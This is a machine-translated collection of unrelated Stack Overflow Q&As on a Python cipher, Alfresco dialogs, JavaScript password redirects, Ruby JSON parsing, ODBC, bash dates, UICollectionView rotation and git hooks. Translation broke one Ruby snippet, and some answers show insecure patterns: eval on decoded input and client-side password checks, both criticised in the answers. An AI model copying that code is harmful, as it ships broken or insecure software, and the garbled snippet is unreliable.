    keynum = 0
    actnum = 0
    total = len(keyword)

    for i in reversed(range(len(text))):
        print str(i) + " " + str(text)

        keynum = total

        while keynum > len(keyword) - 1:
            keynum -= len(keyword)
            keynum += 1

        if keynum < 0:
            keynum = len(keyword) - 1

        actnum = key[keynum]

        while (actnum + i) > len(text) - 1:
            actnum = actnum - len(text)

        temp = text[i]
        text[i] = text[i+actnum]
        text[i+actnum] = temp
        total -= 1

    merged = ""

    for i in range(len(text)):
        merged += text[i]

    return merged

x = encode("wonderland","But I didn't think.")
print decode("wonderland",x) 
```

**编辑：**程序的设置使得如果指定的字符不存在，它会取它应该是的字符并从中减去字符串的长度，直到它在字符串内。

**编辑：**基本上，如果你能帮我反转“编码”功能，那就太好了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T02:19:00.750

为了清楚起见，我稍微重构了代码。我认为问题在于使用了当前位置的偏移量：`text[i+actnum]`

```
def flip(keyword,t,unflip=False):
    text = list(t)
    key = map(lambda x: ord(x)-ord('a'), keyword.lower())

    trange = reversed(range(len(text))) if unflip else range(len(text))

    for i in trange:
        keynum = i%len(keyword)
        actnum = key[keynum]%len(text)
        text[i],text[actnum] = text[actnum],text[i]
        print '%2d <-> %2d  '%(i,actnum),''.join(text)

    return ''.join(text)

x = flip("WONDERLAND","But I didn't think.")
print
flip("WONDERLAND",x,unflip=True) 
```

输出：

```
 0 <->  3    utBI didn't think.
 1 <-> 14    htBI didn't tuink.
 2 <-> 13    htBI didn't tuink.
 3 <->  3    htBI didn't tuink.
 4 <->  4    htBI didn't tuink.
 5 <-> 17    htBIkdidn't tuin .
 6 <-> 11    htBIktidn'd tuin .
 7 <->  0   ihtBIkt dn'd tuin .
 8 <-> 13   ihtBIkt tn'd duin .
 9 <->  3   ihtnIkt tB'd duin .
10 <->  3   iht'Ikt tBnd duin .
11 <-> 14   iht'Ikt tBnu ddin .
12 <-> 13   iht'Ikt tBnud din .
13 <->  3   iht Ikt tBnud'din .
14 <->  4   iht dkt tBnud'Iin .
15 <-> 17   iht dkt tBnud'I ni.
16 <-> 11   iht dkt tBnnd'I ui.
17 <->  0   iht dkt tBnnd'I ui.
18 <-> 13   iht dkt tBnnd.I ui'

18 <-> 13   iht dkt tBnnd'I ui.
17 <->  0   iht dkt tBnnd'I ui.
16 <-> 11   iht dkt tBnud'I ni.
15 <-> 17   iht dkt tBnud'Iin .
14 <->  4   iht Ikt tBnud'din .
13 <->  3   iht'Ikt tBnud din .
12 <-> 13   iht'Ikt tBnu ddin .
11 <-> 14   iht'Ikt tBnd duin .
10 <->  3   ihtnIkt tB'd duin .
 9 <->  3   ihtBIkt tn'd duin .
 8 <-> 13   ihtBIkt dn'd tuin .
 7 <->  0    htBIktidn'd tuin .
 6 <-> 11    htBIkdidn't tuin .
 5 <-> 17    htBI didn't tuink.
 4 <->  4    htBI didn't tuink.
 3 <->  3    htBI didn't tuink.
 2 <-> 13    htBI didn't tuink.
 1 <-> 14    utBI didn't think.
 0 <->  3   But I didn't think. 
```

# workflow - 自定义或更改 Alfresco 中错误的工作流对话框发出的默认消息框

> ID：14469231
> 
> 赞同：4
> 
> 时间：2013-01-22T22:27:54.903
> 
> 标签：workflow, alfresco, alfresco-share

目前，出现一个带有失败类名称的消息框：

[![在此处输入图像描述](../Images/a944890cbd4380f9f9d799ed9efa4f5b.png)](http://www.impulseit.com/downloads/alfresco-wf-messabox.jpg)

是否可以覆盖 Alfresco 中的默认行为？我们可以使用表单服务来呈现不同的信息吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-25T03:49:17.727

除了 zladuric 的回答，

您可以使用**failureCallback**方法来显示您想要的消息。但是由于使用了“开始工作流”、“任务编辑”、“任务详情”等工作流表单，所以很难在工作流表单的failureCallback 方法中搜索新的方法。

例如，在“ **Start Workflow** ”表单中，您可以添加我们自己的`successCallBack`，并像这样在**start-workflow.js**`failureCallBack`中编写**onBeforeFormRuntimeInit**事件处理程序。

 **```
 onBeforeFormRuntimeInit: function StartWorkflow_onBeforeFormRuntimeInit(layer, args)
          {
            var startWorkflowForm = Dom.get(this.generateId + "-form");
            Event.addListener(startWorkflowForm, "submit", this._submitInvoked, this);

            args[1].runtime.setAJAXSubmit(true,
             {
                successCallback:
                {
                   fn: this.onFormSubmitSuccess,
                   scope: this
                },
                failureCallback:
                {
                   fn: this.onFormSubmitFailure,
                   scope: this
                }
             });
          }

 onFormSubmitSuccess: function StartWorkflow_onFormSubmitSuccess(response)
      {
        this.navigateForward(true);
    // Show your success message or do something.
      }
onFormSubmitFailure: function StartWorkflow_onFormSubmitFailure(response)
      {
        var msgTitle = this.msg(this.options.failureMessageKey);
        var msgBody = this.msg(this.options.failureMessageKey);

        // example of showing processing response message
        // you can write your own logic
        if (response.json && response.json.message) 
        {
            if(response.json.message.indexOf("ConcurrencyFailureException") != -1) 
            {
                msgTitle = this.msg("message.concurrencyFailure");
                msgBody = this.msg("message.startedAgain");
            }
            else
                msgBody = response.json.message;
        }
        Alfresco.util.PopupManager.displayPrompt(
                {
                    title: msgTitle,
                    text: msgBody
                });
      } 
```

由于`Alfresco.component.StartWorkflow`（在 start-workflow.js 中）扩展`Alfresco.component.ShareFormManager`（在 alfresco.js 中）。您可以覆盖 start-workflow.js 中的 onBeforeFormRuntimeInit 事件。我希望这对你有所帮助。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-23T22:31:56.533

我现在不看代码，但这看起来像一个常规的 YUI 对话框。所以它被YUI解雇了。所以这个 YUI 是客户端，可能在 My-tasks dashlet 或我的任务页面中。

此外，错误消息看起来像是来自失败的后端消息/服务的 status.message。

您可能会找到该客户端 javascript 文件，找到启动任务的方法并查看它的*failureCallback*处理程序是什么。然后编辑该*failureCallback*方法并使其显示与*response.status.message*或其他任何内容不同的内容。也许像**this.msg("message.my-custom-error-message");** 然后您可以自行定制。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-02-14T12:16:43.380

修改 YUI 对话框脚本也可能会影响其他功能。如果我们自定义 start-workflow。js，它只会以启动工作流的形式实现。

因此，作为通用解决方案，以下是建议。

当 alfresco 渲染工作流表单时，它使用 activiti-transition.js 文件渲染转换按钮。基本上，这些按钮除了提交工作流表单之外什么都不做。

所以最好的方法是，自定义这个 activiti-transition.ftl 和 activiti-transition.js 文件，进行 ajax 调用并根据需要处理响应。

我刚刚查看了如何显示此前端错误的完整流程。

1.  activiti-transition 正在提交工作流表单。
2.  使用一个名为 submitForm 的函数，它位于 alfresco.js 中，它正在调用表单的提交事件
3.  在forms-runtime.js文件中有一个名为*_submitInvoked*的函数（处理表单的提交事件），负责进行ajax调用并提交工作流表单。如果提交时出错，将显示错误这是来自后端。**

# javascript - 带有验证的 self.location.href

> ID：14469243
> 
> 赞同：0
> 
> 时间：2013-01-22T22:28:44.727
> 
> 标签：javascript

我真的可以为我的网站的表单重定向和验证问题提供一些帮助。

我已经成功地让输入的“密码”重定向到输入值，但是如果用户输入错误的密码，他们会得到一个 404 错误——这是正确的，但对用户来说不是很好。

我的问题是，有没有在服务器上针对 txt 或 xml 文件验证表单，并在提交之前验证密码列表？因此，如果不正确，用户会收到警报而不是 404！

以下是当前工作的示例，感谢您的帮助！

```
<html><head>
<SCRIPT TYPE="text/javascript">

function login() {
   if (validLogin()) {
      password = document.userInfos.password.value;
      self.location.href=
        ""+password+"";
      }
   }
function validLogin() {
   if (isBlank(document.userInfos.password.value)){
      alert("Can't be blank");
      document.userInfos.password.focus();
      return false;
      }
   return true;      
   }
function isBlank(s) {
   return (s == "");
   }

   function doKey(e) {
//check to see if the return key was pressed ...
if( event.keyCode == 13){ 
//call the login function ...
login();
//prevent the page from reloading ...
return false;
}
}

//listen for keypress events and then call doKey()
document.onkeypress = doKey;

</SCRIPT>

</head>

        <form  NAME="userInfos" >

<INPUT TYPE="password" NAME="password" LENGTH="20" style="color: #333333" size="23" >&nbsp;&nbsp;&nbsp;&nbsp;<INPUT TYPE="button" style="color: #333333" onClick="login()" VALUE=" View ">
</form>

    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T00:44:20.387

**不要在客户端 JavaScript 中检查密码**；任何访问者都可以使用“查看源代码”获得可用的密码。如果可能，请改为使用 PHP 脚本、CGI 脚本或 htpasswd 文件检查服务器上的密码。

**如果您使用的免费网络主机**不允许任何更好的选择，您可以为您的 URL 发出 AJAX 请求并检查状态代码：

```
var prefix = "/~myusername/passwords/", suffix = ".html";
var url = prefix + document.userInfos.password.value + suffix;

var xhr = new XMLHttpRequest(); // need some more code to support IE 6
xhr.open('GET', url);

xhr.onreadystatechange = function() {

    if (xhr.readyState !== 4) {
        return;
    }

    if (xhr.status === 200) {
        // It's possible to grab user-specific settings from xhr.responseText,
        // (e.g. the URL to redirect to), but for simplicity's sake...
        location.href = url;
    } else {
        alert('Password incorrect');
    }

};

xhr.send(); 
```

但是，请记住以下**限制**：

*   受保护的 HTML 文件应位于与登录页面和密码文件**不同的目录中。**

*   该目录的名称**一定难以预测**。

*   要**撤销用户的访问权限**，您需要**重命名**包含受保护 HTML 文件的目录，并相应地更新所有其他用户密码的文件。

*   直接链接到受保护的文件会暴露它们（直到目录被重命名），并且受保护的文件可能会出于各种已知和未知的原因**出现在 Google或其他搜索引擎上。**

*   没有针对**暴力破解密码猜测**和**通过日志文件泄露**密码的保护措施。

# ruby - Ruby 字符串到数组的转换

> ID：14469245
> 
> 赞同：0
> 
> 时间：2013-01-22T22:28:58.397
> 
> 标签：ruby

我有一个 URL 编码的字符串：

```
a = "%5B%22552A8619-6ECA-4A95-A798-C1E2CE75BFFF%22%2C%2264c19b5b2d0257ddb382dbd3660de3fd%22%2C%22share%22%5D" 
```

如果我对这个字符串进行 URL 解码，那么它将如下所示：

```
"[\"552A8619-6ECA-4A95-A798-C1E2CE75BFFF\",\"64c19b5b2d0257ddb382dbd3660de3fd\",\"share\"]" 
```

从这个字符串我想得到这个数组：

```
["552A8619-6ECA-4A95-A798-C1E2CE75BFFF","64c19b5b2d0257ddb382dbd3660de3fd","share"] 
```

如何在没有讨厌的字符串替换的情况下做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:45:22.490

该字符串是一个使用 JSON 编码的数组：

```
需要'cgi'
需要'json'

a = "%5B%22552A8619-6ECA-4A95-A798-C1E2CE75BFFF%22%2C%2264c19b5b2d0257ddb382dbd3660de3fd%22%2C%22share%22%5D"

JSON[CGI::unescape(a)]

[
    [0] "552A8619-6ECA-4A95-A798-C1E2CE75BFFF",
    [1] "64c19b5b2d0257ddb382dbd3660de3fd",
    [2]“分享”
]

```

`JSON[CGI::unescape(a)].last`会回来`"share"`，让你自由回家。

[`CGI::escape`](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/cgi/rdoc/CGI.html#method-c-unescape)用于删除编码，这会将其转回“正常”的 JSON 编码数组。

[`JSON[]`](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/json/rdoc/JSON.html#method-c-5B-5D)(AKA [`JSON.parse`](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/json/rdoc/JSON.html#method-i-parse)) 将它从 JSON 表示法转换回 Ruby 数组。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-22T22:49:00.817

```
the_given_string.scan(/"(.*?)"/).flatten 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-22T22:39:25.777

您可以删除字符并拆分或评估它：

```
"[\"A798-C1E2CE75BFFF\",\"643fd\",\"share\"]".delete('\"[]').split(',')
# => ["A798-C1E2CE75BFFF", "643fd", "share"]

eval "[\"A798-C1E2CE75BFFF\",\"643fd\",\"share\"]"
# => ["A798-C1E2CE75BFFF", "643fd", "share"] 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-22T22:44:22.530

你可以`eval`字符串：

```
require 'cgi'
a = "%5B%22552A8619-6ECA-4A95-A798-C1E2CE75BFFF%22%2C%2264c19b5b2d0257ddb382dbd3660de3fd%22%2C%22share%22%5D"
x = eval( CGI.unescape(a))
p x #["552A8619-6ECA-4A95-A798-C1E2CE75BFFF", "64c19b5b2d0257ddb382dbd3660de3fd", "share"] 
```

但是 eval 是邪恶的。

您可以使用所谓*的讨厌的字符串替换*：

```
p CGI.unescape(a).gsub(/\A\["|"\]\Z/,'').split(/","/) 
```

或者你可以试试`JSON`：

```
require 'cgi'
require 'json'
a = "%5B%22552A8619-6ECA-4A95-A798-C1E2CE75BFFF%22%2C%2264c19b5b2d0257ddb382dbd3660de3fd%22%2C%22share%22%5D"
x = JSON.load( CGI.unescape(a)) 
```

# mysql - ODBC-ODBC 桥

> ID：14469247
> 
> 赞同：-1
> 
> 时间：2013-01-22T22:29:02.467
> 
> 标签：mysql, odbc

我有一个 mysql 数据库在一台 linux 服务器上运行。使用 odbc 连接到另一个 linux 机器上的 Web 服务器。

我希望能够使用 /an odbc 连接到 Web 服务器来访问 mysql。这适用于在客户端计算机上运行的外部应用程序。

我做了一些谷歌搜索，可能有一个叫做 ODBC-ODBC 桥的东西。

我只想找到一个正确的方向。所以我不会走错方向。

如果有人可以指出我特定的桥接软件。或者教程。或者，如果这甚至是可能的，并且桥接是正确的寻找。ETC...

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:03:53.533

您的帖子似乎对 ODBC 是/做什么感到困惑。

你有一个网络服务器，你有一个数据库。ODBC 不会将它们连接在一起。你需要一些东西来在网络服务器上实现你的代码——PHP、Perl、Ruby、Python、Java、C....

大多数语言都可以使用绑定来与 ODBC 客户端对话——它通常使用数据库本机协议与 DBMS 对话。然而：

1) ODBC 在其功能上受到一定限制 - 因为它必须在一系列后端提供功能的最低公分母

2）我列出的所有语言（以及更多）都支持与 MySQL 和其他 DBMS 的本机（即全功能）连接

这就引出了一个问题，为什么要使用 ODBC？

在某些情况下，ODBC-ODBC 桥可以解决特定问题 - DBMS 提供了客户端不支持的 ODBC 接口。这似乎不是你的问题。

您的目标是从通过网络服务器提供的数据库中获取数据，还是使用 ODBC 构建一些东西（任何东西）？

如果是前者，那么忘记 ODBC - 这是无关紧要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-02-18T20:59:21.373

你的网络服务器应该有 odbc 连接来连接到 MySQL 数据库，是的，你有。当你确实有这种连接时，我想你真的不需要你的客户直接连接到 MySQL 数据库。因为无论您想运行什么查询（插入或查询操作），您只需将其提交到网络服务器，它就会为您获取查询结果。

# linux - 在 unix 中转换任何日期格式

> ID：14469249
> 
> 赞同：0
> 
> 时间：2013-01-22T22:29:15.583
> 
> 标签：linux, unix, date

如何将任何用户输入的日期转换为`yyyy/mm/dd`？

例如，用户可以以下列格式之一输入日期：

```
20120121
2012-01-21
01/21/2012
01/21/2012
... 
```

但我需要将用户输入的任何日期转换为`yyyy/mm/dd (2012/01/2012)`. 有什么建议吗？

这是我一直在尝试的，但它不起作用：

```
echo "Please enter the date: " 
read X 
a=$X+"%y/%m/%d"
echo $a 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:18:34.097

你可以试试这个命令：

```
#!/bin/bash

date='2013-01-23'
from='%Y-%m-%d'
to='%Y/%m/%d'
python -c 'import sys, datetime; print(datetime.datetime.strptime(sys.argv[1], sys.argv[2]).strftime(sys.argv[3]))' $date $from $to 
```

# ios - 将设备旋转为横向时的 UICollectionViewFlowLayout 大小警告

> ID：14469251
> 
> 赞同：38
> 
> 时间：2013-01-22T22:29:18.903
> 
> 标签：ios, objective-c, uicollectionview, uicollectionviewlayout

我们使用 UICollectionView 来显示覆盖全屏的单元格（减去状态和导航栏）。单元格大小设置为`self.collectionView.bounds.size`：

```
- (void)viewWillAppear:(BOOL)animated
{
    //
    // value isn't correct with the top bars until here
    //
    CGSize tmpSize = self.collectionView.bounds.size;
    _currentCellSize = CGSizeMake( (tmpSize.width), (tmpSize.height));
}

- (CGSize)collectionView:(UICollectionView *)collectionView
                  layout:(UICollectionViewLayout*)collectionViewLayout
  sizeForItemAtIndexPath:(NSIndexPath *)indexPath {

    return _currentCellSize;
} 
```

这将为每个设备设置正确的大小。每个单元格都被定义为没有插图，并且布局没有页眉或页脚。但是，当我们从纵向旋转到横向时，我们会得到以下“抱怨”：

```
the behavior of the UICollectionViewFlowLayout is not defined because:
the item height must be less that the height of the UICollectionView minus the section insets top and bottom values. 
```

现在我理解了这个错误，但是我们重置了单元格的大小并使用了旋转过渡中内置的流布局：

```
-(void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration
{
    //self.collectionView.bounds are still the last size...not the new size here
}
- (void)didRotateFromInterfaceOrientation: UIInterfaceOrientation)fromInterfaceOrientation
{
    CGSize tmpSize = self.collectionView.bounds.size;
    _currentCellSize = CGSizeMake( (tmpSize.width), (tmpSize.height));
    [self.collectionView performBatchUpdates:nil completion:nil];//this will force the redraw/size of the cells.
} 
```

单元格在横向中正确渲染。

似乎 Flow Layout 看到了旧的单元格大小（这会导致抱怨，因为它太高了），但确实读取/渲染了`didRotateFromInterfaceOrientation`.

有没有办法摆脱投诉？

我们尝试在设备旋转过渡期间找到另一个挂钩，该挂钩可以访问正确的目标屏幕尺寸（与当前屏幕尺寸相比），但没有成功。调试输出显示投诉发生在 之后`willRotateToInterfaceOrientation`但之前`didRotateFromInterfaceOrientation`。

我们也验证了显而易见的；如果我们将单元格高度设置为小于横向屏幕高度的固定大小，则不会发生投诉。此外，从横向旋转回纵向时不会发生投诉。

一切运行良好，并且渲染正确。然而，这种抱怨让我们感到担忧。其他人有任何想法或解决方案吗？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-03-25T20:28:02.413

我得到了同样的警告。对“reloadData”方法不满意，我发现在设置集合视图的框架`[self.collectionView.collectionViewFlowLayout invalidateLayout]` **之前调用会消除警告并产生预期的结果。**

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2014-06-27T21:30:07.833

不要再向这个满载但不被接受的芭比娃娃扔虾。

```
- (CGSize)collectionView:(UICollectionView *)collectionView 
                  layout:(UICollectionViewLayout *)collectionViewLayout
  sizeForItemAtIndexPath:(NSIndexPath *)indexPath {

    [collectionView setContentInset:UIEdgeInsetsMake(0, 0, 0, 0)];
    return CGSizeMake(100, collectionView.frame.size.height);
} 
```

在返回单元格大小之前设置内容插图对我有用。

笔记：

我在故事板中使用容器视图来加载 UIViewController 中的集合视图。我尝试在情节提要中的 flowLayout 对象上设置它。故事板中的集合视图。并覆盖其中一个 UICollectionViewDelegateFlowLayout；虽然我不记得是哪一个。我也不确定这是否适用于垂直布局。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-07-11T01:44:00.463

在

```
[UIViewController willAnimateRotationToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration] 
```

我打电话了，`[UICollectionViewLayout invalidateLayout]`似乎工作得很好。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2015-02-10T04:42:23.530

我解决了。

你应该让flowLayout的高度小于collcetionView.frame.size.height。

```
 [flowLayout setItemSize:CGSizeMake(width, height)];

 collectionView.frame = CGRectMake(12, 380, 290, 80); 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2016-03-31T12:49:46.330

许多解决方案都建议添加`invalidateLayout`-`willAnimateRotationToInterfaceOrientation`但自 iOS 8 以来已弃用。

对于 iOS 8 及更高版本，请使用：

```
- (void)viewWillTransitionToSize:(CGSize)size withTransitionCoordinator:(id<UIViewControllerTransitionCoordinator>)coordinator
{
    [super viewWillTransitionToSize:size withTransitionCoordinator:coordinator];

    [self.collectionView.collectionViewLayout invalidateLayout];
} 
```

感谢@user7097242 的评论，这里有一个 swift4 版本：

```
override func viewWillTransition(to size: CGSize, with coordinator: UIViewControllerTransitionCoordinator) {
    super.viewWillTransition(to: size, with: coordinator)
    self.collectionView.collectionViewLayout.invalidateLayout()
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-10-22T16:45:18.040

刚刚遇到并解决了同样的问题。由于我的解决方案更符合您的要求并且与任何现有答案都不匹配，因此我已将其发布在这里。

```
#define NUMBER_OF_CELLS_PER_ROW 1

- (UICollectionViewFlowLayout *)flowLayout {
    return (UICollectionViewFlowLayout *)self.collectionViewLayout;
}

- (CGSize)itemSizeInCurrentOrientation {
    CGFloat windowWidth = self.collectionView.window.bounds.size.width;

    CGFloat width = (windowWidth - (self.flowLayout.minimumInteritemSpacing * (NUMBER_OF_CELLS_PER_ROW - 1)) - self.flowLayout.sectionInset.left - self.flowLayout.sectionInset.right)/NUMBER_OF_CELLS_PER_ROW;

    CGFloat height = 80.0f;

   return CGSizeMake(width, height);
}

- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration {
    [super willRotateToInterfaceOrientation:toInterfaceOrientation duration:duration];
    [self.flowLayout invalidateLayout];
    self.flowLayout.itemSize = [self itemSizeInCurrentOrientation];
}

- (void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation {
    // Now that the rotation is complete, load the cells.
    [self.collectionView reloadData];
} 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2015-04-03T07:50:13.147

这对我有用：（希望它也对你有用！）

```
- (void)viewWillLayoutSubviews 
{     
     self.flowLayout.itemSize = CGSizeMake(self.collectionView.bounds.size.width/4,self.collectionView.bounds.size.height);    
     [self.flowLayout invalidateLayout];
}

- (void)viewDidLayoutSubviews     
{
    self.flowLayout.itemSize = CGSizeMake(self.collectionView.bounds.size.width/4,self.collectionView.bounds.size.height); 
} 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2014-11-03T08:37:45.743

我的修复就像取消选中 IB 中视图控制器的“调整滚动视图插图”一样简单，因为我需要我的导航栏是半透明的。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2013-07-25T17:58:26.900

我遇到了同样的问题。如果集合视图在纵向显示时，单元格将在旋转到横向时消失。我在这里结合了其他答案来解决这个问题。

我将视图（包含 UICollectionView 的视图）设置为接收`UIDeviceOrientationDidChangeNotification`通知。在响应该通知的方法中，调整 UICollectionView 框架后，我执行了以下操作：

```
- (void)orientationChanged:(NSNotification *)notification
{
    CGSize size = (CGSize){self.frame.size.width - 2*kContentMargin, self.frame.size.height - 2*kContentMargin};
    [self.collectionView.collectionViewLayout setItemSize:size];

    [self.collectionView.collectionViewLayout invalidateLayout];
    [self.collectionView reloadData];
} 
```

请注意， UICollectionView 的框架在旋转时会自动设置，因为它的 resizingMask 在初始化时设置为此：

```
self.collectionView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight; 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2014-02-25T09:17:04.130

这为我解决了它：

```
-(void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration
{
    [super willRotateToInterfaceOrientation:toInterfaceOrientation duration:duration];
    [self.collectionView.collectionViewLayout invalidateLayout];
} 
```

我正在使用这个委托方法来设置大小：

```
- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout*)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath 
```

我可以从那里在旋转后使用正确的框架：

```
self.collectionView.frame.size 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2013-03-13T19:18:37.460

我遇到了同样的问题。这就是我解决它的方法。希望能帮助到你

```
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(    NSTimeInterval)duration
{
    [super willRotateToInterfaceOrientation:toInterfaceOrientation duration:duration];

    [self.collectionView reloadData];
} 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2014-01-29T10:02:23.840

尝试这个...

```
UICollectionViewFlowLayout *layout = (id) self.collectionView.collectionViewLayout;

layout.itemSize = CGSizeMake(0.1, 0.1); 
```

它对我有用。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2014-11-03T15:59:04.263

我使用了`UICollectionViewFlowLayoutInvalidationContext`，我在其中计算了新的偏移量，使其保持相同的内容偏移量。我自己的函数`collectionViewSizeForOrientation:`返回正确的大小。它并不完美，但至少它不是粗略的：

```
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration
{
    CGSize fromCollectionViewSize = [self collectionViewSizeForOrientation:[self interfaceOrientation]];
    CGSize toCollectionViewSize = [self collectionViewSizeForOrientation:toInterfaceOrientation];

    CGFloat currentPage = [_collectionView contentOffset].x / [_collectionView bounds].size.width;
    NSInteger itemCount = [_collectionView numberOfItemsInSection:0];

    UICollectionViewFlowLayoutInvalidationContext *invalidationContext = [[UICollectionViewFlowLayoutInvalidationContext alloc] init];

    [invalidationContext setContentSizeAdjustment:CGSizeMake(toCollectionViewSize.width * itemCount - fromCollectionViewSize.width * itemCount, toCollectionViewSize.height - fromCollectionViewSize.height)];
    [invalidationContext setContentOffsetAdjustment:CGPointMake(currentPage * toCollectionViewSize.width - [_collectionView contentOffset].x, 0)];

    [[_collectionView collectionViewLayout] invalidateLayoutWithContext:invalidationContext];

    [super willRotateToInterfaceOrientation:toInterfaceOrientation duration:duration];
} 
```

`collectionViewSizeForOrientation:`在我的情况下，假设插入和项目间距为0：

```
- (CGSize)collectionViewSizeForOrientation:(UIInterfaceOrientation)orientation
{
    CGSize screenSize = [[UIScreen mainScreen] bounds].size;

    CGFloat width = UIInterfaceOrientationIsLandscape(orientation) ? MAX(screenSize.width, screenSize.height) : MIN(screenSize.width, screenSize.height);
    CGFloat height = UIInterfaceOrientationIsLandscape(orientation) ? MIN(screenSize.width, screenSize.height) : MAX(screenSize.width, screenSize.height);

    return CGSizeMake(width, height); 
```

}

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2013-07-28T16:59:49.090

您可以继承`UICollectionView`和覆盖`setBounds:`. 在调用之前`[super setBounds:]`，可以将项目大小调整到新的边界。
您应该检查边界的大小是否已更改，因为`setBounds:`在滚动时也会调用。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2015-03-03T04:46:54.547

我知道这是一个老问题，但我刚遇到同样的问题，花了一个小时来解决它。我的问题是，似乎 UICollectionView 的帧大小总是错误的（高度与容器不匹配），而我在调用 UICollectionView Flow 布局委托之前设置了帧大小。因此，我在方法上再次设置了 UICollectionView 帧大小：

```
-(CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath 
```

这就是诀窍。高度现在显示正确并且警告消失了。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2014-05-29T17:22:19.707

以下代码为我修复了它：

```
-(CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath {
return self.collectionView.frame.size;
} 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2013-02-06T18:26:21.123

我在调整 UICollectionView 的框架时遇到了同样的问题。如果我使用 FlowLayout 上的委托方法来返回单元格的大小（将根据包含的 UICollectionView 的大小进行更新），当我调整（更小）UICollectionView 的框架时，我会收到错误消息，因为它在抱怨之前似乎没有要求代表提供更新的尺寸信息。它最终会在重绘时向委托方法询问大小信息，但在我分配新的框架方法时它仍然会发出警告。为了摆脱警告，我*之前明确设置了 UICollectionViewFlowLayout 对象的 itemSize 属性*我将框架设置为一个新的更小的值。我的情况很简单，我认为我可以在这一点上进行 itemSize 计算（因为我在集合视图中的所有项目都是相同的大小），而不是依赖于委托方法。只是在实现委托方法的同时设置 itemSize 属性并*不能解决*问题，因为我认为如果检测到委托方法已实现，它会忽略 itemSize 的值（如果它知道它在那里，为什么不调用它？！）。希望这会有所帮助 - 也许您也可以在旋转之前显式设置 itemSize。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2013-05-24T07:12:57.860

只是为了抑制警告并（可能，不确定）在返回大小之前提高性能

`- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath`

检查视图控制器是否正在旋转，是否返回一些相对较小的尺寸，如`CGSizeMake(0.1, 0.1)`

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2015-03-25T01:32:22.913

试图找到一种解决方案来消除 iOS 7 上的这些警告对我来说很困难。我最终求助于子类`UICollectionView`化并添加了以下代码。

```
- (void)setFrame:(CGRect)frame
{
    if (!iOS8 && (frame.size.width != self.frame.size.width))
    {
        [self.collectionViewLayout invalidateLayout];
    }

    [super setFrame:frame];
} 
```

有些人可能想用`CGSizeEqualToSize()`.

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2016-03-01T22:24:58.423

注意：就我而言，我发现我们正在设置有问题的**`preferredContentSize`**属性`UIViewController`。如果您发现这是您的情况，您可能必须处理协议的以下方法`UICollectionViewDelegateFlowLayout`：

```
- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath {
    CGSize size = collectionViewLayout.collectionView.bounds.size;
    ...
    return size;
} 
```

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2015-11-15T16:42:45.557

在 didRotateFromInterfaceOrientation 的末尾尝试：

```
[self.collectionView setNeedsLayout] 
```

如果它不起作用，请尝试将所有这些东西从 didRotateFromInterfaceOrientation 移动到 willRotateToInterfaceOrientation

# linux - git post-receive checkout 到远程机器？

> ID：14469255
> 
> 赞同：2
> 
> 时间：2013-01-22T22:29:27.597
> 
> 标签：linux, git, bash, rsync

